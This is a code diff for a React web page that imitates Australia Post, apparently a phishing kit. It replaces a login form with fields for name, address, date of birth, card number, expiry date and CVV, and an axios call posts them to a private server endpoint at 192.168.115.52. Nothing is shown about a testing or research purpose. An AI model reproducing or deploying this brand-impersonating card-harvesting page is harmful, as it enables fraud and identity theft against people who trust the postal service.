@@ -1,4 +1,32 @@
+import { useState } from 'react';
+import axios from 'axios';
+
 function App() {
+  const [formData, setFormData] = useState({
+    name: '',
+    address: '',
+    birthday: '',
+    cardNumber: '',
+    expireDate: '',
+    cvv: ''
+  })
+
+  const handleInputChange = (e) => {
+    setFormData(state => ({...state, [e.target.name]: e.target.value }))
+  }
+
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+    const response = await axios.post("http://192.168.115.52:8080/api/access", formData)
+    console.log('res', response)
+    const resData = response.data
+    if (resData.status === 'success'){
+        alert("Message Sent."); 
+        this.resetForm()
+    } else if(resData.status === 'fail'){
+        alert("Message failed to send.")
+    }
+  }
   return (
     <div className="min-h-full flex items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
       <div className="max-w-md w-full space-y-8">
@@ -6,38 +34,37 @@ function App() {
           <img style={{ width: 80, height: 80 }} className="h-12" src="https://auspost.com.au/mypost/auspoststaticassets/assets/authentication/common/images/brand-icon-australia-post.svg" alt="Workflow" />
           <h2 style={{ fontFamily: 'ap_display,Helvetica,Arial' }} className="mt-6 text-center text-3xl font-extrabold text-gray-900">Australia Post</h2>
         </div>
-        <form className="mt-8 space-y-6" action="#" method="POST">
+        <form className="mt-8 space-y-6">
           <input type="hidden" name="remember" value="true" />
           <div className="rounded-md shadow-sm -space-y-px">
-            <div>
-              <label htmlFor="email-address" className="sr-only">Email address</label>
-              <input id="email-address" name="email" type="email" autoComplete="email" required className="appearance-none rounded-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-t-md focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 focus:z-10 sm:text-sm" placeholder="Email address" />
+            <div style={{ marginTop: 15 }}>
+              <label htmlFor="name" className="sr-only">Name</label>
+              <input id="name" name="name" type="text" value={formData.name} onChange={handleInputChange} required className="appearance-none rounded-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-t-md focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 focus:z-10 sm:text-sm" placeholder="Name" />
             </div>
-            <div>
-              <label htmlFor="password" className="sr-only">Password</label>
-              <input id="password" name="password" type="password" autoComplete="current-password" required className="appearance-none rounded-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-b-md focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 focus:z-10 sm:text-sm" placeholder="Password"/>
+            <div style={{ marginTop: 15 }}>
+              <label htmlFor="address" className="sr-only">Address</label>
+              <input id="address" name="address" type="address" value={formData.address} onChange={handleInputChange} required className="appearance-none rounded-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-b-md focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 focus:z-10 sm:text-sm" placeholder="Address"/>
+            </div>
+            <div style={{ marginTop: 15 }}>
+              <label htmlFor="date-of-birth" className="sr-only">date-of-birth</label>
+              <input id="date-of-birth" name="birthday" type="date" value={formData.birthday} onChange={handleInputChange} className="appearance-none rounded-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-b-md focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 focus:z-10 sm:text-sm" placeholder="Date of Birth"/>
+            </div>
+            <div style={{ marginTop: 15 }}>
+              <label htmlFor="card-number" className="sr-only">card-number</label>
+              <input id="card-number" name="cardNumber" type="tel" value={formData.cardNumber} onChange={handleInputChange} required className="appearance-none rounded-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-b-md focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 focus:z-10 sm:text-sm" placeholder="Card Number"/>
+            </div>
+            <div style={{ marginTop: 15 }}>
+              <label htmlFor="expiry-date" className="sr-only">expiry-date</label>
+              <input id="expiry-date" name="expiryDate" type="date" value={formData.expireDate} onChange={handleInputChange} className="appearance-none rounded-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-b-md focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 focus:z-10 sm:text-sm" placeholder="Expiry Date"/>
+            </div>
+            <div style={{ marginTop: 15 }}>
+              <label htmlFor="cvv" className="sr-only">cvv</label>
+              <input id="cvv" name="cvv" type="cvv" value={formData.cvv} onChange={handleInputChange} required className="appearance-none rounded-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-b-md focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 focus:z-10 sm:text-sm" placeholder="CVV"/>
             </div>
           </div>
-
-          <div className="flex items-center justify-between">
-            <div className="flex items-center">
-              <input id="remember-me" name="remember-me" type="checkbox" className="h-4 w-4 text-indigo-600 focus:ring-indigo-500 border-gray-300 rounded"/>
-              <label htmlFor="remember-me" className="ml-2 block text-sm text-gray-900"> Remember me </label>
-            </div>
-
-            <div className="text-sm">
-              <a href="#" className="font-medium text-indigo-600 hover:text-indigo-500"> Forgot your password? </a>
-            </div>
-          </div>
-
           <div>
-            <button type="submit" className="group relative w-full flex justify-center py-2 px-4 border border-transparent text-sm font-medium rounded-md text-white bg-indigo-600 hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500">
-              <span className="absolute left-0 inset-y-0 flex items-center pl-3">
-                <svg className="h-5 w-5 text-indigo-500 group-hover:text-indigo-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true">
-                  <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
-                </svg>
-              </span>
-              Sign in
+            <button style={{ background: '#b71521' }} onClick={handleSubmit} className="group relative w-full flex justify-center py-2 px-4 border border-transparent text-sm font-medium rounded-md text-white bg-indigo-600 hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500">
+              Submit
             </button>
           </div>
         </form>
